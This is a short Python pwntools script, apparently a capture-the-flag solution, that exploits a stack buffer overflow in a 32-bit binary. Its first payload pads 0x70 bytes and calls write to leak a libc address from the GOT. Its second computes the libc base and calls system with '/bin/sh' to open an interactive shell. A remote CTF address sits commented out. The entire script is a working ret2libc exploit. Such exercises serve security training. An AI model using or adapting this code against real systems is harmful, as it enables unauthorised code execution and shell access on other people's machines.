from pwn import *
from LibcSearcher import LibcSearcher

context.log_level = 'DEBUG'

p = process('../file/bed0c68697f74e649f3e1c64ff7838b8')
# p = remote('61.147.171.105', '61298')

# 使用本地libc进行调试
libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')

input('conitnue?')

binsh_offset = next(libc.search(b'/bin/sh'))
system_offset = libc.symbols['system']
write_offset = libc.symbols['write']

write_plt = 0x080483c0
write_got = 0x0804a010
main_addr = 0x080483d0

payload = flat(
    b'a' * 0x70,
    write_plt,
    main_addr,
    1,
    write_got,
    4
)

p.recvline()
p.sendline(payload)

write_addr = u32(p.recv(4))
libc_base_addr = write_addr - write_offset
# obj = LibcSearcher('write', write_addr)
# libc_base_addr = write_addr - obj.dump('write')
# system_offset = obj.dump('system')
# binsh_offset = obj.dump('str_bin_sh')

payload = flat(
    b'a' * 0x70,
    system_offset + libc_base_addr,
    0,
    binsh_offset + libc_base_addr,
)

p.recvline()
p.sendline(payload)

p.interactive()